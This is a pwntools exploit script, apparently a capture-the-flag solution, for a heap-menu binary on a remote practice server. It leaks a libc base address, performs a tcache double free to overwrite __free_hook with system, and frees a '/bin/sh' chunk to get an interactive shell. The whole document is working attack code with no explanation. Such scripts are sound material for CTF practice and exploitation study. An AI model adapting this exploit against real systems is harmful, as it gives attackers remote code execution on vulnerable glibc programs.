from pwn import *

#context.log_level = 'debug'

#p = process('./ciscn_s_6')
p = remote('node4.buuoj.cn', 25533)
libc = ELF('./libc-2.27.buu.so')

def alloc(size, content):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'compary\'s name\n', str(size).encode())
    p.sendafter(b'input name:\n', content)
    p.sendlineafter(b'compary call:\n', b'123')

def show(index):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'index:\n', str(index).encode())

def delete(index):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'index:\n', str(index).encode())

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

alloc(0x420, b'a') #0
alloc(0x40, b'a') #1
delete(0)

alloc(0x30, b'a' * 8) #2

show(2)
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x70 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

delete(1)
delete(1)

alloc(0x40, p64(free_hook)) #3
alloc(0x40, b'/bin/sh\x00') #4
alloc(0x40, p64(system)) #5

delete(4)

p.interactive()